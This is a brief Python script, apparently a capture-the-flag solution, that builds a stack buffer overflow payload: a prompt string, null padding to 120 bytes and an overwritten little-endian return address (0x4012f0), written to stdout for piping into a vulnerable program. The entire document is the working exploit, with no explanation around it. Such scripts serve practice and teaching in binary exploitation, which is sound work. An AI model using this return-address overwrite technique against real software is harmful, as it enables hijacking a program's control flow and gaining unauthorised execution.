#!/usr/bin/env python3
import sys

def p64(v):
    if isinstance(v, bytes) and len(v) == 8:
        return v
    if not (isinstance(v, int) and v.bit_length() <= 64):
        raise ValueError("v should be bytes of length 8 *or* "
                         "int representable with <= 64 bits")
    return v.to_bytes(8, "little", signed = v < 0)

intro    = b"Please, give me a hint"
padding  = b"\0" * (120 - len(intro))
ret_addr = p64(0x4012f0)

exploit = intro + padding + ret_addr + b"\n"
sys.stdout.buffer.write(exploit)
